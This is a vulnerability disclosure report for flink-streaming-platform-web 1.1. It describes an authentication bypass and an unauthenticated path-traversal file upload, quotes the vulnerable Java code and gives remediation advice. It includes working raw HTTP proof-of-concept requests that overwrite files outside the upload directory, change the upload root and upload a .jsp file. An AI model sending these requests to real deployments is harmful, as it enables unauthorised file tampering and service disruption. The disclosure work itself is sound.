# flink-streaming-platform-web 1.1 Unauthenticated Arbitrary File Upload

## Vulnerability Type :

Arbitrary File Upload / Path Traversal (unauthenticated arbitrary file write / overwrite)

## Vulnerability Version :

1.1 (GitHub master `c602cd1ec59135d8f1ea8c689abf2940261f58b6`, 2025-12-02; reproduced from the official Gitee mirror, commit `8f15d37aae429a43fd4c09b20e89fa7ae4b29e96`)

## Recurring environment:

* Windows 10 (10.0.26200, x64)
* JDK 1.8.0_311
* MySQL 8.0.36 (isolated instance at 127.0.0.1:3307)
* Spring Boot 2.2.8.RELEASE (embedded Tomcat)
* flink-streaming-platform-web 1.1, default port 8180
* Maven 3.6.2

## Vulnerability Description AND recurrence:

### 1. Discovery

1. The target was selected under the criteria "1,000–2,000 GitHub stars, Java, no NVD CVE": `zhp8341/flink-streaming-platform-web` (1,857 stars; NVD `keywordSearch` returned `totalResults=0`). The product is a web management platform for Flink SQL jobs, providing job submission, JAR upload and configuration management.
2. While auditing the login interceptor, we found that `LoginInterceptor.preHandle` only validates the session when the request carries `X-Requested-With: XMLHttpRequest`; all other requests fall through to `return true` without any authentication check:

```java
// flink-streaming-web/src/main/java/com/flink/streaming/web/interceptor/LoginInterceptor.java:43-57
UserSession userSession = UserSessionUtil.userSession(request);

// ajax请求
if (WebUtil.isAjaxRequest(request)) {
  boolean nologin = (userSession == null) || (!userService.checkLogin(userSession));
  if (nologin) { ... return false; }
  return true;
}
log.debug("未知请求={}", request.getRequestURI());
return true;   // non-AJAX request: no login check at all
```

```java
// flink-streaming-web/src/main/java/com/flink/streaming/web/utils/WebUtil.java:23-24
public static boolean isAjaxRequest(HttpServletRequest request) {
  return "XMLHttpRequest".equalsIgnoreCase(request.getHeader("X-Requested-With"));
}
```

3. Following the file-upload flow, we found that `/api/upload` concatenates the raw multipart filename directly onto the upload path before writing the file, without any filename sanitisation, extension whitelist or path-containment validation:

```java
// flink-streaming-web/src/main/java/com/flink/streaming/web/controller/api/UploadApiController.java:39-63
@RequestMapping(value = "/upload", method = RequestMethod.POST, consumes = "multipart/form-data")
public RestResult<?> upload(@RequestPart MultipartFile file) {
  String uploadPath = systemConfigService.getUploadJarsPath();
  File uploadDir = new File(uploadPath);
  if (!uploadDir.exists()) { uploadDir.mkdirs(); }

  String originalFilename = file.getOriginalFilename();     // fully attacker-controlled
  File localFile = new File(uploadPath + originalFilename); // plain string concatenation, no filtering
  file.transferTo(localFile);                               // writes to the traversed path

  UploadFileDTO uploadFileDTO = new UploadFileDTO();
  uploadFileDTO.setFileName(originalFilename);
  uploadFileDTO.setFilePath(localFile.getPath());           // traversal path stored as-is
  ...
  uploadFileService.addFile(uploadFileDTO);
  return RestResult.success();
}
```

4. The upload root comes from system configuration:

```java
// flink-streaming-web/src/main/java/com/flink/streaming/web/service/impl/SystemConfigServiceImpl.java:169-175
public String getUploadJarsPath() {
  String path = this.getSystemConfigByKey(SysConfigEnum.FLINK_STREAMING_PLATFORM_WEB_HOME.getKey());
  if (StringUtils.isEmpty(path)) { throw new BizException("请先去系统设置界面设置..."); }
  return path + SystemConstant.VIRGULE + SystemConstant.JAR_ROOT_PATH; // + "/upload_jars/"
}
```

That configuration item can be modified through the unauthenticated endpoint `/api/upsertSynConfig` (also reachable because of the authentication bypass in step 2), and the only validation is that the value starts and ends with `/`; `..` is not rejected. An attacker can therefore fully control the upload root.

5. We deployed the source locally and verified four scenarios: normal upload, path-traversal overwrite, cross-directory overwrite, and arbitrary-extension upload. All succeeded.

### 2. Reproduction steps

#### 1. Deployment

```bash
mysqld --initialize-insecure --datadir="D:/Hacker/Code Audit/CodeQL/source/mysql3307"
mysqld --datadir="D:/Hacker/Code Audit/CodeQL/source/mysql3307" --port=3307 --console &
mysql -h127.0.0.1 -P3307 -uroot -e "ALTER USER 'root'@'localhost' IDENTIFIED BY '123456';"
mysql -h127.0.0.1 -P3307 -uroot -p123456 < docs/sql/flink_web.sql

mvn -DskipTests clean package

java -jar flink-streaming-web/target/flink-streaming-web.jar \
  "--spring.datasource.url=jdbc:mysql://127.0.0.1:3307/flink_web?serverTimezone=UTC&useUnicode=true&characterEncoding=utf-8&useSSL=false" \
  --spring.datasource.username=root --spring.datasource.password=123456 \
  --server.port=8180 --spring.profiles.active=dev
```

#### 2. Unauthenticated change of the upload root (prerequisite)

```http
POST /api/upsertSynConfig?key=flink_streaming_platform_web_home&val=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Ffspw_upload%2F HTTP/1.1
Host: 127.0.0.1:8180
User-Agent: curl/8.5.0
Content-Length: 0
```

```http
HTTP/1.1 200
Content-Type: application/json;charset=UTF-8
Transfer-Encoding: chunked

{"code":"200","success":true,"message":"","data":null,"page":null}
```

The upload root then becomes `.../fspw_upload//upload_jars/`. No login session, cookie or token was used at any point.

#### 3. Unauthenticated normal upload (proves anonymous access to the endpoint)

```http
POST /api/upload HTTP/1.1
Host: 127.0.0.1:8180
User-Agent: curl/8.5.0
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFSPW
Accept: */*

------WebKitFormBoundaryFSPW
Content-Disposition: form-data; name="file"; filename="plain_probe_20261025.txt"
Content-Type: text/plain

PLAIN-UNAUTH-UPLOAD-20261025
------WebKitFormBoundaryFSPW--
```

```http
HTTP/1.1 200
Content-Type: application/json;charset=UTF-8
Transfer-Encoding: chunked

{"code":"200","success":true,"message":"","data":null,"page":null}
```

File written to: `C:/fspw_upload/upload_jars/plain_probe_20261025.txt`.

#### 3.1 The "file already exists" response (important)

`UploadFileServiceImpl.addFile()` performs the duplicate-name check **after** `transferTo` has already written the file:

```java
// flink-streaming-web/src/main/java/com/flink/streaming/web/service/impl/UploadFileServiceImpl.java:38-44
public void addFile(UploadFileDTO uploadFileDTO) {
  UploadFile uploadFile = uploadFileMapper.getFileByName(uploadFileDTO.getFileName());
  if (uploadFile != null) {
    throw new BizException(MESSAGE_012);   // "file already exists"
  }
  uploadFileMapper.insert(UploadFileDTO.toEntity(uploadFileDTO));
}
```

Therefore, uploading the same `filename` a second time returns `{"code":"500","message":"文件已经存在"}` ("file already exists"), but the target file has already been overwritten with the second payload. Local results:

| Attempt | filename                      | Response                  | Target file content                 |
| ------- | ----------------------------- | ------------------------- | ----------------------------------- |
| 1       | `../dup_probe_20261026.txt`   | 200                       | PAYLOAD-A                           |
| 2       | `../dup_probe_20261026.txt`   | 500 (file already exists) | **PAYLOAD-B (already overwritten)** |
| 3       | `./../dup_probe_20261026.txt` | 200                       | PAYLOAD-C                           |

On the third attempt, prefixing the filename with `./` changes the `file_name` string stored in the database, so the duplicate check is bypassed; path normalisation still resolves to the same file. The "file already exists" message must therefore not be treated as proof that the overwrite was blocked. When reproducing, use a filename that has not been uploaded before (as in the next section), or verify the target file with `cat`/MD5.

#### 4. Path traversal overwrite of a file outside the upload directory (core PoC)

Target file before the attack:

```
0e2663f2d7b63c9b064a0a7b5aff0fef  C:/fspw_upload/overwrite_target_20261026.txt
ORIGINAL-CONTENT-OVERWRITE-TARGET-20261026
```

Request (using a previously unused filename to avoid the duplicate check described in 3.1):

```http
POST /api/upload HTTP/1.1
Host: 127.0.0.1:8180
User-Agent: curl/8.5.0
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFSPW
Accept: */*

------WebKitFormBoundaryFSPW
Content-Disposition: form-data; name="file"; filename="../overwrite_target_20261026.txt"
Content-Type: text/plain

PROOF-UNAUTH-OVERWRITE-20261026
------WebKitFormBoundaryFSPW--
```

Actual response (raw packet `raw/f2_core_poc.resp`):

```http
HTTP/1.1 200
Content-Type: application/json;charset=UTF-8
Transfer-Encoding: chunked
Date: Sun, 25 Oct 2026 16:18:23 GMT

{"code":"200","success":true,"message":"","data":null,"page":null}
```

Target file after the attack:

```
b7b4027592783366c8c59aceb3bdde47  C:/fspw_upload/overwrite_target_20261026.txt
PROOF-UNAUTH-OVERWRITE-20261026
```
<img width="1026" height="495" alt="image" src="https://github.com/user-attachments/assets/3d64a926-8752-43fe-b4c8-bbdcc4681fcb" />

The target `C:/fspw_upload/overwrite_target_20261026.txt` is a sibling of the upload directory `.../fspw_upload/upload_jars/`, i.e. outside the upload root, which proves that `../` is not filtered.

<img width="1139" height="405" alt="image" src="https://github.com/user-attachments/assets/90ac697c-d543-419f-8547-7f3b0055174f" />

<img width="590" height="230" alt="image" src="https://github.com/user-attachments/assets/4dfab2d1-53fc-43c6-8671-84081aa1fad5" />

#### 5. Overwrite of an arbitrary file in the workspace

```http
POST /api/upload HTTP/1.1
Host: 127.0.0.1:8180
User-Agent: curl/8.5.0
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFSPW
Accept: */*

------WebKitFormBoundaryFSPW
Content-Disposition: form-data; name="file"; filename="../../Users/l3in/Documents/Qoder/2026-10-21/629fa6c6/fspw_unauth_write_proof2.txt"
Content-Type: text/plain

EVIDENCE-WORKSPACE-OVERWRITE-2026-10-25
------WebKitFormBoundaryFSPW--
```

```http
HTTP/1.1 200
Content-Type: application/json;charset=UTF-8
Content-Length: 85

{"code":"500","success":false,"message":"文件已经存在","data":null,"page":null}
```

Result: the content of `fspw_unauth_write_proof2.txt` was replaced with `EVIDENCE-WORKSPACE-OVERWRITE-2026-10-25`, and its MD5 changed from `29357532a039878042ca0049cc3e661a` to `fc6fe640dbe75eb416f15841b0474279`.

<img width="1022" height="501" alt="image" src="https://github.com/user-attachments/assets/d1916d51-75f6-4599-b1e4-fab1f3070250" />
<img width="1249" height="437" alt="image" src="https://github.com/user-attachments/assets/e85921b3-6888-43bd-93fe-84cfc9ff451a" />


#### 6. Arbitrary file extension

```http
POST /api/upload HTTP/1.1
Host: 127.0.0.1:8180
User-Agent: curl/8.5.0
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFSPW
Accept: */*

------WebKitFormBoundaryFSPW
Content-Disposition: form-data; name="file"; filename="shell_20261025.jsp"
Content-Type: application/octet-stream

<% out.println("UNAUTH_JSP_UPLOAD_PROOF_20261025"); %>
------WebKitFormBoundaryFSPW--
```

```http
HTTP/1.1 200
Content-Type: application/json;charset=UTF-8
Transfer-Encoding: chunked

{"code":"200","success":true,"message":"","data":null,"page":null}
```

File written to: `C:/fspw_upload/upload_jars/shell_20261025.jsp`. The endpoint is only supposed to accept `.jar` files, but any extension can be written.
<img width="1058" height="499" alt="image" src="https://github.com/user-attachments/assets/3f487eac-deb8-427a-bb34-60a54036d86a" />
<img width="664" height="231" alt="image" src="https://github.com/user-attachments/assets/bb61c19e-d071-4941-9a3d-364c89489bb2" />

#### 7. Negative control

The same upload request with `X-Requested-With: XMLHttpRequest` added returns:

```http
HTTP/1.1 200
Content-Type: application/json;charset=utf-8
Transfer-Encoding: chunked

{"code":"401","success":false,"message":"未登录认证！","data":null,"page":null}
```

No file is written. This confirms that the interceptor logic itself works and that the vulnerability is the "skip authentication when the header is absent" branch.

### 8. Database records

```
id  file_name                                                          file_path
1   plain_probe.txt                                                     \..\..\...\fspw_upload\upload_jars\plain_probe.txt
2   ../overwrite_target.txt                                            \..\..\...\upload_jars\..\overwrite_target.txt
3   ../../Users/l3in/.../unauth_write_proof.txt                        \..\..\...\upload_jars\..\..\Users\...
4   ../shell.jsp                                                       \..\..\...\upload_jars\..\shell.jsp
5   plain_probe_20261025.txt                                           \..\..\...\upload_jars\plain_probe_20261025.txt
6   ../overwrite_target2.txt                                           \..\..\...\upload_jars\..\overwrite_target2.txt
7   ../../Users/l3in/.../fspw_unauth_write_proof2.txt                  \..\..\...\upload_jars\..\..\Users\...
8   shell_20261025.jsp                                                 \..\..\...\upload_jars\shell_20261025.jsp
13  ../overwrite_target_20261026.txt                                   \..\..\...\upload_jars\..\overwrite_target_20261026.txt
```

The traversal paths are stored verbatim in `upload_file.file_path`, and `editor` is empty (no user session). These attacker-controlled paths also enable the arbitrary file deletion chain through `/api/deleteFile`.

### 9. Impact

1. An unauthenticated attacker can write arbitrary content with an arbitrary extension to any path writable by the service;
2. Files outside the upload directory (application JARs, configuration files, startup scripts, other business files) can be overwritten, causing configuration tampering or service disruption;
3. Overwriting the application's own files creates a further code-execution risk after a service restart;
4. The written paths are persisted in the database and can be combined with `/api/deleteFile` to form an arbitrary file deletion chain;
5. CVSS 3.1: `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H` = **9.1 (Critical)**.

> Note: the local deployment is a Spring Boot application with embedded Tomcat and no JSP engine. Uploading a `.jsp` file only proves that arbitrary extensions can be written; it is not claimed as RCE. The "upload a JAR and execute it through Flink" RCE chain was not verified because no Flink cluster was deployed, so it is excluded from this report's conclusions.

### 10. Remediation

1. Stop making authentication depend on a request header: `LoginInterceptor` must validate the session for every non-whitelisted request;
2. Sanitise the upload filename with `FilenameUtils.getName()` or rename files to a UUID; keep the original name only for display;
3. Enforce an extension whitelist (this endpoint should accept only `.jar`) and validate file content;
4. Verify with `getCanonicalPath()` that the final path is inside the upload root;
5. Perform duplicate/business checks before writing the file, so that a failed response cannot leave an overwritten file behind;
6. Require authentication on `/api/upsertSynConfig` and make the platform installation directory a fixed server-side value instead of accepting it from the request;
7. Put the excluded paths `/download/*` and `/readLocal/*` behind authentication as well.

### 11. Evidence files

- Raw HTTP: `D:/Hacker/Code Audit/CodeQL/source/fspw-evidence/raw/e3_*`, `e4_*`, `e5_*`, `e6_*`, `e8_*`
- Core PoC request/response and hashes: `raw/f2_core_poc.req`, `raw/f2_core_poc.resp`, `raw/f2_core_poc_before_hash.txt`, `raw/f2_core_poc_after_hash.txt`
- Duplicate-name evidence: `raw/f2_dup_u1.json`, `raw/f2_dup_u2.json`, `raw/f2_dup_u3.json`, `raw/f2_dup_behavior_note.txt`
- Before/after hashes: `raw/before_hashes.txt`, `raw/after_overwrite_hash.txt`, `raw/before_workspace_hash.txt`, `raw/after_workspace_hash.txt`
- Database records: `raw/db_upload_rows.txt`, `raw/f2_db_after.txt`
- Full-page report screenshot: `flink-streaming-platform-web-CVE-report-cn-20261026-full.png`
- Chinese original: `flink-streaming-platform-web-未授权任意文件上传-CVE格式报告-20261026.md`
- Full audit report (Chinese): `C:/Users/l3in/Documents/Qoder/2026-10-21/629fa6c6/flink-streaming-platform-web-未授权任意文件上传删除-审计报告-20261025.md`

---

## Appendix: Report screenshot

Full-page render (1075 × 8015) of the Chinese original, stored in the same directory as this document:

![Report full-page screenshot](./flink-streaming-platform-web-CVE-report-cn-20261026-full.png)
